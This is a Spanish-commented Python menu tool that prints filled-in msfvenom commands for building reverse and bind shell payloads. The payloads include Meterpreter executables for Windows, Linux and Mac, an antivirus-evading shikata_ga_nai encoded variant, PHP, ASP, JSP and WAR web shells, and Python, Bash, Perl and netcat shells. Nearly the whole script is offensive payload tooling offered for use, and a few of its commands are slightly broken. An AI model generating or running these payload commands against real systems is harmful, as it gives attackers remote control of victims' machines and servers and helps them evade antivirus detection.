#!/usr/bin/python3
#Script para generar reverse y binds shells con msfvenom
#By Z0diacc 

from colorama import Fore, Style
import os, time, sys 
from time import sleep
import requests 
import signal 

def signal_handler(key,frame):
    print(Fore.YELLOW + "\n[*]" + Fore.RESET + " Saliendo... \n")
    print(Style.RESET_ALL)
    sys.exit(1)
    
signal=signal.signal(signal.SIGINT,signal_handler)

def banner():
    print("""  
                                                                                                                                       
                                                                                                                                   
   SSSSSSSSSSSSSSS HHHHHHHHH     HHHHHHHHHEEEEEEEEEEEEEEEEEEEEEELLLLLLLLLLL             LLLLLLLLLLL                SSSSSSSSSSSSSSS 
 SS:::::::::::::::SH:::::::H     H:::::::HE::::::::::::::::::::EL:::::::::L             L:::::::::L              SS:::::::::::::::S
S:::::SSSSSS::::::SH:::::::H     H:::::::HE::::::::::::::::::::EL:::::::::L             L:::::::::L             S:::::SSSSSS::::::S
S:::::S     SSSSSSSHH::::::H     H::::::HHEE::::::EEEEEEEEE::::ELL:::::::LL             LL:::::::LL             S:::::S     SSSSSSS
S:::::S              H:::::H     H:::::H    E:::::E       EEEEEE  L:::::L                 L:::::L               S:::::S            
S:::::S              H:::::H     H:::::H    E:::::E               L:::::L                 L:::::L               S:::::S            
 S::::SSSS           H::::::HHHHH::::::H    E::::::EEEEEEEEEE     L:::::L                 L:::::L                S::::SSSS         
  SS::::::SSSSS      H:::::::::::::::::H    E:::::::::::::::E     L:::::L                 L:::::L                 SS::::::SSSSS    
    SSS::::::::SS    H:::::::::::::::::H    E:::::::::::::::E     L:::::L                 L:::::L                   SSS::::::::SS  
       SSSSSS::::S   H::::::HHHHH::::::H    E::::::EEEEEEEEEE     L:::::L                 L:::::L                      SSSSSS::::S 
            S:::::S  H:::::H     H:::::H    E:::::E               L:::::L                 L:::::L                           S:::::S
            S:::::S  H:::::H     H:::::H    E:::::E       EEEEEE  L:::::L         LLLLLL  L:::::L         LLLLLL            S:::::S
SSSSSSS     S:::::SHH::::::H     H::::::HHEE::::::EEEEEEEE:::::ELL:::::::LLLLLLLLL:::::LLL:::::::LLLLLLLLL:::::LSSSSSSS     S:::::S
S::::::SSSSSS:::::SH:::::::H     H:::::::HE::::::::::::::::::::EL::::::::::::::::::::::LL::::::::::::::::::::::LS::::::SSSSSS:::::S
S:::::::::::::::SS H:::::::H     H:::::::HE::::::::::::::::::::EL::::::::::::::::::::::LL::::::::::::::::::::::LS:::::::::::::::SS 
 SSSSSSSSSSSSSSS   HHHHHHHHH     HHHHHHHHHEEEEEEEEEEEEEEEEEEEEEELLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLL SSSSSSSSSSSSSSS   
                                                                                                                                   
                                                                                                                                   
                                                                                                                                   
                                                                                                                                   
                                                                                                                                   

          """ +Fore.YELLOW + """by"""+Fore.RESET + """: Z0diacc | (https://github.com/z0d1acc)

    """)
banner()

def opciones():
    print(Style.DIM + """
    
\n\t\tELIGE EL TIPO DE REVERSE SHELL:
\n\t"""+Fore.GREEN+"""[1]"""+Fore.RESET+""" Linux Reverse Meterpreter Reverse Shell
\t"""+Fore.BLUE+"""[2]"""+Fore.RESET+""" Windows Meterpreter Reverse TCP Shell
\t"""+Fore.GREEN+"""[3]"""+Fore.RESET+""" Windows Reverse TCP Shell
\t"""+Fore.BLUE+"""[4]"""+Fore.RESET+""" Windows Encoded Meterpreter Windows Reverse Shell
\t"""+Fore.GREEN+"""[5]"""+Fore.RESET+""" Mac Reverse Shel
\t"""+Fore.BLUE+"""[6]"""+Fore.RESET+""" PHP Meterpreter Reverse TCP -Web
\t"""+Fore.GREEN+"""[7]"""+Fore.RESET+""" ASP Meterpreter Reverse TCP -Web
\t"""+Fore.BLUE+"""[8]"""+Fore.RESET+""" JSP Java Meterpreter Reverse TCP -Web
\t"""+Fore.GREEN+"""[9]"""+Fore.RESET+""" WAR Meterpreter Reverse TCP -Web
\t"""+Fore.BLUE+"""[10]"""+Fore.RESET+""" Python Reverse Shell
\t"""+Fore.GREEN+"""[11]"""+Fore.RESET+""" Bash Unix Reverse Shell
\t"""+Fore.BLUE+"""[12]"""+Fore.RESET+""" Perl Unix Reverse shell
\t"""+Fore.GREEN+"""[13]"""+Fore.RESET+""" Netcat Reverse Shell

\n\t\tELIGE EL TIPO DE BIND SHELL:
\n\t"""+Fore.BLUE+"""[14]"""+Fore.RESET+""" Linux Meterpreter Bind Shell
\t"""+Fore.GREEN+"""[15]"""+Fore.RESET+""" Linux Generic Bind Shell
\t"""+Fore.BLUE+"""[16]"""+Fore.RESET+""" Mac Bind Shell
\t"""+Fore.GREEN+"""[17]"""+Fore.RESET+""" Netcat Bind Shell 


    """ + Style.RESET_ALL)    

######################Definir opciones con casos: ##################
 
opciones()


#############REVERSE SHELLS##############


def lmrs():
    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce LOCAL IP: ")
    lport=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el PORT: ")
    sname=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "SHELL NAME: ")

    bash_shell="""  msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=%sLPORT=%s -f elf > %s """%(lhost,lport,sname+".elf")
    sleep(1)
    print(Fore.RED + "\n\t[CREATED] \n\t"+Fore.RESET+Style.BRIGHT+"%s"%(bash_shell)+Style.RESET_ALL)
    print(" ")
            
def wmrs():
    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce LOCAL IP: ")
    lport=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el PORT: ")
    sname=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "SHELL NAME: ")

    bash_shell=""" msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f exe >  %s """%(lhost,lport,sname+".exe")
    sleep(1)
    print(Fore.RED + "\n\t[CREATED] \n\t"+Fore.RESET+Style.BRIGHT+"%s"%(bash_shell)+Style.RESET_ALL)
    print(" ")      


def wrs():
    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce LOCAL IP: ")
    lport=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el PORT: ")
    sname=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "SHELL NAME: ")

    bash_shell=""" msfvenom -p windows/shell/reverse_tcp LHOST=%s LPORT=%s -f exe >  %s """%(lhost,lport,sname+".exe")
    sleep(1)
    print(Fore.RED + "\n\t[CREATED] \n\t"+Fore.RESET+Style.BRIGHT+"%s"%(bash_shell)+Style.RESET_ALL)
    print(" ")       

def wemrs():
    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce LOCAL IP: ")
    lport=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el PORT: ")
    sname=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "SHELL NAME: ")

    bash_shell="""  msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 LHOST=%s LPORT=%s -f exe >  %s """%(lhost,lport,sname+".exe")
    sleep(1)
    print(Fore.RED + "\n\t[CREATED] \n\t"+Fore.RESET+Style.BRIGHT+"%s"%(bash_shell)+Style.RESET_ALL)
    print(" ")  

def mrs():
    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce LOCAL IP: ")
    lport=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el PORT: ")
    sname=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "SHELL NAME: ")

    bash_shell="""  msfvenom -p osx/x86/shell_reverse_tcp LHOST=%s LPORT=%s -f macho >  %s """%(lhost,lport,sname+".macho")
    sleep(1)
    print(Fore.RED + "\n\t[CREATED] \n\t"+Fore.RESET+Style.BRIGHT+"%s"%(bash_shell)+Style.RESET_ALL)
    print(" ")     

def phpmrs():
    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce LOCAL IP: ")
    lport=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el PORT: ")
    sname=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "SHELL NAME: ")

    bash_shell="""  msfvenom -p php/meterpreter_reverse_tcp LHOST=%s LPORT=%s -f raw >  %s """%(lhost,lport,sname+".php")
    sleep(1)
    print(Fore.RED + "\n\t[CREATED] \n\t"+Fore.RESET+Style.BRIGHT+"%s"%(bash_shell)+Style.RESET_ALL)
    print("\n\tUna vez creada:  cat shell.php | pbcopy && echo ‘<?php ‘ | tr -d ‘\n’ > shell.php && pbpaste >> shell.php")
    print(" ")
    
def aspmrs():
    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce LOCAL IP: ")
    lport=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el PORT: ")
    sname=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "SHELL NAME: ")

    bash_shell="""  msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f asp >  %s """%(lhost,lport,sname+".asp")
    sleep(1)
    print(Fore.RED + "\n\t[CREATED] \n\t"+Fore.RESET+Style.BRIGHT+"%s"%(bash_shell)+Style.RESET_ALL)
    print(" ")

def aspmrs():
    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce LOCAL IP: ")
    lport=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el PORT: ")
    sname=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "SHELL NAME: ")

    bash_shell="""  msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f asp >  %s """%(lhost,lport,sname+".asp")
    sleep(1)
    print(Fore.RED + "\n\t[CREATED] \n\t"+Fore.RESET+Style.BRIGHT+"%s"%(bash_shell)+Style.RESET_ALL)
    print(" ")

def jspmrs():
    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce LOCAL IP: ")
    lport=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el PORT: ")
    sname=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "SHELL NAME: ")

    bash_shell="""  msfvenom -p java/jsp_shell_reverse_tcp LHOST=%s LPORT=%s -f raw >  %s """%(lhost,lport,sname+".jsp")
    sleep(1)
    print(Fore.RED + "\n\t[CREATED] \n\t"+Fore.RESET+Style.BRIGHT+"%s"%(bash_shell)+Style.RESET_ALL)
    print(" ")

def warmrs():
    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce LOCAL IP: ")
    lport=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el PORT: ")
    sname=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "SHELL NAME: ")

    bash_shell="""  msfvenom -p java/jsp_shell_reverse_tcp LHOST=%s LPORT=%s -f raw >  %s """%(lhost,lport,sname+".war")
    sleep(1)
    print(Fore.RED + "\n\t[CREATED] \n\t"+Fore.RESET+Style.BRIGHT+"%s"%(bash_shell)+Style.RESET_ALL)
    print(" ")    

def pythonrs():
    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce LOCAL IP: ")
    lport=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el PORT: ")
    sname=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "SHELL NAME: ")

    bash_shell="""  msfvenom -p cmd/unix/reverse_python LHOST=%s LPORT=%s -f raw >  %s """%(lhost,lport,sname+".py")
    sleep(1)
    print(Fore.RED + "\n\t[CREATED] \n\t"+Fore.RESET+Style.BRIGHT+"%s"%(bash_shell)+Style.RESET_ALL)
    print(" ")  
    
def bashrs():
    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce LOCAL IP: ")
    lport=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el PORT: ")
    sname=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "SHELL NAME: ")

    bash_shell=""" msfvenom -p cmd/unix/reverse_bash LHOST=%s LPORT=%s -f raw >  %s """%(lhost,lport,sname+".sh")
    sleep(1)
    print(Fore.RED + "\n\t[CREATED] \n\t"+Fore.RESET+Style.BRIGHT+"%s"%(bash_shell)+Style.RESET_ALL)
    print(" ") 

def perlrs():
    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce LOCAL IP: ")
    lport=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el PORT: ")
    sname=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "SHELL NAME: ")

    bash_shell=""" msfvenom -p cmd/unix/reverse_perl LHOST=%s LPORT=%s -f raw >  %s """%(lhost,lport,sname+".pl")
    sleep(1)
    print(Fore.RED + "\n\t[CREATED] \n\t"+Fore.RESET+Style.BRIGHT+"%s"%(bash_shell)+Style.RESET_ALL)
    print(" ") 

def ncrs():
    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce LOCAL IP: ")
    lport=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el PORT: ")
    sname=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "SHELL NAME: ")

    bash_shell=""" msfvenom -p cmd/unix/reverse_netcat LHOST=%s LPORT=%s -f python >  %s """%(lhost,lport,sname+".py")
    sleep(1)
    print(Fore.RED + "\n\t[CREATED] \n\t"+Fore.RESET+Style.BRIGHT+"%s"%(bash_shell)+Style.RESET_ALL)
    print(" ") 

#############BIND SHELLS##############

def lmbs():
    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce REMOTE_IP: ")
    lport=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el PORT: ")
    sname=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "SHELL NAME: ")

    bash_shell=""" msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=%s LPORT=%s -f elf > %s """%(lhost,lport,sname+".elf")
    sleep(1)
    print(Fore.RED + "\n\t[CREATED] \n\t"+Fore.RESET+Style.BRIGHT+"%s"%(bash_shell)+Style.RESET_ALL)
    print(" ")
    
def lgbs():
    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce REMOTE_IP: ")
    lport=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el PORT: ")
    sname=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "SHELL NAME: ")

    bash_shell=""" msfvenom -p generic/shell_bind_tcp RHOST=%s LPORT=%s -f elf >  %s """%(lhost,lport,sname+".elf")
    sleep(1)
    print(Fore.RED + "\n\t[CREATED] \n\t"+Fore.RESET+Style.BRIGHT+"%s"%(bash_shell)+Style.RESET_ALL)
    print(" ")

def mbs():
    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce REMOTE_IP: ")
    lport=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el PORT: ")
    sname=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "SHELL NAME: ")

    bash_shell="""  msfvenom -p osx/x86/shell_bind_tcp RHOST=%s LPORT=%s -f macho >  %s """%(lhost,lport,sname+".macho")
    sleep(1)
    print(Fore.RED + "\n\t[CREATED] \n\t"+Fore.RESET+Style.BRIGHT+"%s"%(bash_shell)+Style.RESET_ALL)
    print(" ")    

def ncbs():
    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce REMOTE_IP: ")
    lport=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el PORT: ")
    sname=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "SHELL NAME: ")

    bash_shell=""" msfvenom -p cmd/unix/bind_netcat LHOST=%s LPORT=%s -f python >  %s """%(lhost,lport,sname+".py")
    sleep(1)
    print(Fore.RED + "\n\t[CREATED] \n\t"+Fore.RESET+Style.BRIGHT+"%s"%(bash_shell)+Style.RESET_ALL)
    print(" ")        



##########Definicion de casos#####################


while True:
    comando=input(Fore.GREEN + "z0diacc$~" + Fore.RESET)
    if(comando=="1"):
        lmrs()
    elif(comando=="2"):
        wmrs()
    elif(comando=="3"):
        wrs()
    elif(comando=="4"):
        wemrs()
    elif(comando=="5"):
        mrs()
    elif(comando=="6"):
        phpmrs()
    elif(comando=="7"):
        aspmrs()
    elif(comando=="8"):
        jspmrs()
    elif(comando=="9"):
        warmrs()
    elif(comando=="10"):
        pythonrs()  
    elif(comando=="11"):
        bashrs()
    elif(comando=="12"):
        perlrs()
    elif(comando=="13"):
        ncrs()
    elif(comando=="14"):
        lmbs()
    elif(comando=="15"):
        lgbs()    
    elif(comando=="16"):
         mbs()   
    elif(comando=="17"):
         ncbs()
    elif(comando=="exit"):
         sys.exit()         
          
    else:
        print(Fore.RED + "[-]"+Fore.RESET+ " Command not found!") 

        
